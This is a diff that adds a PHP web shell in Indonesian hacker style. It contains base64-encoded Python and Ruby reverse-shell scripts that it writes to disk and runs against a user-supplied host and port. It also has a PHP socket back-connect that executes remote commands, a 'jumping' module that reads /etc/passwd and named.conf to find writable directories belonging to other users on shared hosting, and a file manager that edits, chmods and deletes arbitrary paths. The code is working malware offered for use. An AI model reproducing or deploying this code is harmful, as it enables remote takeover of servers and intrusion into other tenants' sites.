+$becaa=base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBDb243ZXh0IC0gWGFpIFN5bmRpY2F0ZVxuVGhhbmtzIEdvb2dsZSBGb3IgUmVmZXJlbnNpXG5cbicnJykNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwwKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDEpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMikNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwzKQ0KICAgIHNoZWxsID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pDQogIGV4Y2VwdCBzb2NrZXQudGltZW91dDoNCiAgICBwcmludCAiVGltT3V0Ig0KICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgIHByaW50ICJFcnJvciIsIGUNCnB5YmFja2Nvbm5lY3QoKQ==");
+$pbcaa=@fopen('bcpyt.py','w');
+fwrite($pbcaa,$becaa);
+$out1 = exe("python bcpyt.py ".$_POST['server']." ".$_POST['port']);
+sleep(1);
+echo "<pre>$out1\n".exe("ps aux | grep bcpyt.py")."</pre>";
+unlink("bcpyt.py");
+}
+if($_POST['backconnect'] == 'ruby') {
+$becaak=base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
+$pbcaak=@fopen('bcruby.rb','w');
+fwrite($pbcaak,$becaak);
+$out2 = exe("ruby bcruby.rb ".$_POST['server']." ".$_POST['port']);
+sleep(1);
+echo "<pre>$out2\n".exe("ps aux | grep bcruby.rb")."</pre>";
+unlink("bcruby.rb");
+}
+if($_POST['backconnect'] == 'php') {
+            $ip = $_POST['server'];
+            $port = $_POST['port'];
+            $sockfd = fsockopen($ip , $port , $errno, $errstr );
+            if($errno != 0){
+              echo "<font color='red'>$errno : $errstr</font>";
+            } else if (!$sockfd)  {
+              $result = "<p>Unexpected error has occured, connection may have failed.</p>";
+            } else {
+              fputs ($sockfd ,"
+                \n{################################################################}
+                \n..:: BackConnect Php By Con7ext ::..
+                \n{################################################################}\n");
+              $dir = shell_exec("pwd");
+              $sysinfo = shell_exec("uname -a");
+              $time = Shell_exec("time");
+              $len = 1337;
+              fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
+              while(!feof($sockfd)){ $cmdPrompt = '[Con7ext]#:> ';
+              fputs ($sockfd , $cmdPrompt );
+              $command= fgets($sockfd, $len);
+              fputs($sockfd , "\n" . shell_exec($command) . "\n\n");
+            }
+            fclose($sockfd);
+            }
+          }
+        echo "</p></div>";
+}
+
+ elseif($_GET['jancok'] == 'jumping') {
+    $i = 0;
+    echo "<pre><div class='margin: 5px auto;'>";
+    $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
+    while($passwd = fgets($etc)) {
+        if($passwd == '' || !$etc) {
+            echo "<font color=red>Can't read /etc/passwd</font>";
+        } else {
+            preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
+            foreach($user_jumping[1] as $user_rabbitz_jump) {
+                $user_jumping_dir = "/home/$user_rabbitz_jump/public_html";
+                if(is_readable($user_jumping_dir)) {
+                    $i++;
+                    $jrw = "[<font color=white>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
+                    if(is_writable($user_jumping_dir)) {
+                        $jrw = "[<font color=white>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
+                    }
+                    echo $jrw;
+                    if(function_exists('posix_getpwuid')) {
+                        $domain_jump = file_get_contents("/etc/named.conf");    
+                        if($domain_jump == '') {
+                            echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
+                        } else {
+                            preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
+                            foreach($domains_jump[1] as $dj) {
+                                $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+                                $user_jumping_url = $user_jumping_url['name'];
+                                if($user_jumping_url == $user_rabbitz_jump) {
+                                    echo " => ( <u>$dj</u> )<br>";
+                                    break;
+                                }
+                            }
+                        }
+                    } else {
+                        echo "<br>";
+                    }
+                }
+            }
+        }
+    }
+    if($i == 0) { 
+    } else {
+        echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
+    }
+    echo "</div></pre>";
+}
+elseif($_GET['do'] == 'jumping') {
+    $i = 0;
+    echo "<div class='margin: 5px auto;'>";
+    if(preg_match("/hsphere/", $dir)) {
+        $urls = explode("\r\n", $_POST['url']);
+        if(isset($_POST['jump'])) {
+            echo "<pre>";
+            foreach($urls as $url) {
+                $url = str_replace(array("http://","www."), "", strtolower($url));
+                $etc = "/etc/passwd";
+                $f = fopen($etc,"r");
+                while($gets = fgets($f)) {
+                    $pecah = explode(":", $gets);
+                    $user = $pecah[0];
+                    $dir_user = "/hsphere/local/home/$user";
+                    if(is_dir($dir_user) === true) {
+                        $url_user = $dir_user."/".$url;
+                        if(is_readable($url_user)) {
+                            $i++;
+                            $jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a><br>";
+                            if(is_writable($url_user)) {
+                                $jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a><br>";
+                            }
+                            echo $jrw."<br>";
+                        }
+                    }
+                }
+            }
+        if($i == 0) { 
+        } else {
+            echo "<br>Total ada ".$i." Kamar di ".$ip;
+        }
+        echo "</pre>";
+        } else {
+            echo '<center>
+                  <form method="post">
+                  List Domains: <br>
+                  <textarea name="url" style="width: 500px; height: 250px;">';
+            $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
+            while($getss = fgets($fp)) {
+                echo $getss;
+            }
+            echo  '</textarea><br>
+                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
+                  </form></center>';
+        }
+    } elseif(preg_match("/vhosts/", $dir)) {
+        $urls = explode("\r\n", $_POST['url']);
+        if(isset($_POST['jump'])) {
+            echo "<pre>";
+            foreach($urls as $url) {
+                $web_vh = "/var/www/vhosts/$url/httpdocs";
+                if(is_dir($web_vh) === true) {
+                    if(is_readable($web_vh)) {
+                        $i++;
+                        $jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a><br>";
+                        if(is_writable($web_vh)) {
+                            $jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a><br>";
+                        }
+                        echo $jrw."<br>";
+                    }
+                }
+            }
+        if($i == 0) { 
+        } else {
+            echo "<br>Total ada ".$i." Kamar di ".$ip;
+        }
+        echo "</pre>";
+        } else {
+            echo '<center>
+                  <form method="post">
+                  List Domains: <br>
+                  <textarea name="url" style="width: 500px; height: 250px;">';
+                  bing("ip:$ip");
+            echo  '</textarea><br>
+                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
+                  </form></center>';
+        }
+    } else {
+        echo "<pre>";
+        $etc = fopen("/etc/passwd", "r");
+        while($passwd = fgets($etc)) {
+            if($passwd == '' || !$etc) {
+                echo "<font color=red>Can't read /etc/passwd</font>";
+            } else {
+                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
+                foreach($user_jumping[1] as $user_idx_jump) {
+                    $user_jumping_dir = "/home/$user_idx_jump/public_html";
+                    if(is_readable($user_jumping_dir)){
+                        $i++;
+                        $jrw = "[<font color=lime>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
+                        if(is_writable($user_jumping_dir)) {
+                            $jrw = "[<font color=lime>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
+                        }
+                        echo $jrw;
+                        if(function_exists('posix_getpwuid')) {
+                            $domain_jump = file_get_contents("/etc/named.conf");    
+                            if($domain_jump == '') {
+                                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
+                            } else {
+                                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
+                                foreach($domains_jump[1] as $dj) {
+                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+                                    $user_jumping_url = $user_jumping_url['name'];
+                                    if($user_jumping_url == $user_idx_jump) {
+                                        echo " => ( <u>$dj</u> )<br>";
+                                        break;
+                                    }
+                                }
+                            }
+                        } else {
+                            echo "<br>";
+                        }
+                    }
+                }
+            }
+        }
+        if($i == 0) { 
+        } else {
+            echo "<br>Total ada ".$i." Kamar di ".$ip;
+        }
+        echo "</pre>";
+    }
+    echo "</div>";
+}
+elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
+if($_POST['opt'] == 'chmod'){
+if(isset($_POST['perm'])){
+if(chmod($_POST['path'],$_POST['perm'])){
+echo '<font color="green">Success !</font><br/>';
+}else{
+echo '<font color="red">Denied !</font><br />';
+}
+}
+echo '<form method="POST">
+Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="chmod">
+<input class="sinput" type="submit" value="Go" />
+</form>';
+}
+elseif(isset($_GET['filesrc'])){
+    echo "<tr><td>";
+    echo '</tr></td></table><br />';
+    echo "<textarea cols=80 rows=20 name='src'>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea><br />";
+}elseif($_POST['opt'] == 'rename'){
+if(isset($_POST['newname'])){
+if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+echo '<font color="green">Success !</font><br/>';
+}else{
+echo '<font color="red">Denied !</font><br />';
+}
+$_POST['name'] = $_POST['newname'];
+}
+echo '<form method="POST">
+New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="rename">
+<input class="sinput" type="submit" value="Go" />
+</form>';
+}elseif($_POST['opt'] == 'edit'){
+if(isset($_POST['src'])){
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo '<font color="green">Success !</font><br/>';
+}else{
+echo '<font color="red">Denied !</font><br/>';
+}
+fclose($fp);
+}
+echo '<form method="POST">
+<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="edit">
+<input class="sinput" type="submit" value="Save" />
+</form>';
+}
+echo '</center>';
+}else{
+echo '</table><br/><center>';
+
+if(isset($_GET['filesrc'])){
+    echo "<tr><td>Current File : ";
+    echo $_GET['filesrc'];
+    echo '</tr></td></table><br />';
+    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
+}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
+    if($_POST['opt'] == 'chmod'){
+        if(isset($_POST['perm'])){
+            if(chmod($_POST['path'],$_POST['perm'])){
+                echo '<font color="green">Change Permission Done.</font><br />';
+            }else{
+                echo '<font color="red">Change Permission Error.</font><br />';
+            }
+        }
+        echo '<form method="POST">
+        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
+        <input type="hidden" name="path" value="'.$_POST['path'].'">
+        <input type="hidden" name="opt" value="chmod">
+        <input class="sinput" type="submit" value="Go" />
+        </form>';
+    }elseif($_POST['opt'] == 'rename'){
+        if(isset($_POST['newname'])){
+            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+                echo '<font color="green">Change Name Done.</font><br />';
+            }else{
+                echo '<font color="red">Change Name Error.</font><br />';
+            }
+            $_POST['name'] = $_POST['newname'];
+        }
+        echo '<form method="POST">
+        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+        <input type="hidden" name="path" value="'.$_POST['path'].'">
+        <input type="hidden" name="opt" value="rename">
+        <input class="sinput" type="submit" value="Go" />
+        </form>';
+    }elseif($_POST['opt'] == 'edit'){
+        if(isset($_POST['src'])){
+            $fp = fopen($_POST['path'],'w');
+            if(fwrite($fp,$_POST['src'])){
+                echo '<font color="green">Edit File Done.</font><br />';
+            }else{
+                echo '<font color="red">Edit File Error.</font><br />';
+            }
+            fclose($fp);
+        }
+        echo '<form method="POST">
+        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+        <input type="hidden" name="path" value="'.$_POST['path'].'">
+        <input type="hidden" name="opt" value="edit">
+        <input class="sinput" type="submit" value="Go" />
+        </form>';
+    }
+    echo '</center>';
+}else{
+    echo '</table><br /><center>';
+    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+        if($_POST['type'] == 'dir'){
+            if(rmdir($_POST['path'])){
+                echo '<font color="green">Delete Dir Done.</font><br />';
+            }else{
+                echo '<font color="red">Delete Dir Error.</font><br />';
+            }
+        }elseif($_POST['type'] == 'file'){
+            if(unlink($_POST['path'])){
+                echo '<font color="green">Delete File Done.</font><br />';
+            }else{
+                echo '<font color="red">Delete File Error.</font><br />';
+            }
+        }
+    }
+
+echo '</center>';$scandir = scandir($path);
+    echo '<table width="700" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="abir">
+        <td><center>Name</center></td>
+        <td><center>Size</center></td>
+        <td><center>Permissions</center></td>
+        <td><center>Options</center></td>
+    </tr>
+    ';
+
+    foreach($scandir as $dir){
+        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
+        echo "<tr>
+        <td><a href=\"?path=$path/$dir\">$dir</a></td>
+        <td><center>--</center></td>
+        <td><center>";
+        if(is_writable("$path/$dir")) echo '<font color="aqua">';
+        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
+        echo perms("$path/$dir");
+        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
+        
+        echo "</center></td>
+        <td><center><form method=\"POST\" action=\"?option&path=$path\">
+        <select name=\"opt\">
+        <option value=\"\">Select</option>
+        <option value=\"delete\">Delete</option>
+        <option value=\"chmod\">Chmod</option>
+        <option value=\"rename\">Rename</option>
+        </select>
+        <input type=\"hidden\" name=\"type\" value=\"dir\">
+        <input type=\"hidden\" name=\"name\" value=\"$dir\">
+        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
+        <input class=\"sinput\" type=\"submit\" value=\">\" />
+        </form></center></td>
+        </tr>";
+    }
+    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+    foreach($scandir as $file){
+        if(!is_file("$path/$file")) continue;
+        $size = filesize("$path/$file")/1024;
+        $size = round($size,3);
+        if($size >= 1024){
+            $size = round($size/1024,2).' MB';
+        }else{
+            $size = $size.' KB';
+        }
+
+        echo "<tr>
+        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
+        <td><center>".$size."</center></td>
+        <td><center>";
+        if(is_writable("$path/$file")) echo '<font color="aqua">';
+        elseif(!is_readable("$path/$file")) echo '<font color="red">';
+        echo perms("$path/$file");
+        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
+        echo "</center></td>
+        <td><center><form method=\"POST\" action=\"?option&path=$path\">
+        <select name=\"opt\">
+        <option value=\"\">Select</option>
+        <option value=\"delete\">Delete</option>
+        <option value=\"chmod\">Chmod</option>
+        <option value=\"rename\">Rename</option>
+        <option value=\"edit\">Edit</option>
+        </select>
+        <input type=\"hidden\" name=\"type\" value=\"file\">
+        <input type=\"hidden\" name=\"name\" value=\"$file\">
+        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
+        <input class=\"sinput\" type=\"submit\" value=\">\" />
+        </form></center></td>
+        </tr>";
+    }
+    echo '</table>
+    </div>';
+}
+echo '
+</BODY>
+</HTML>';
+}
+?>
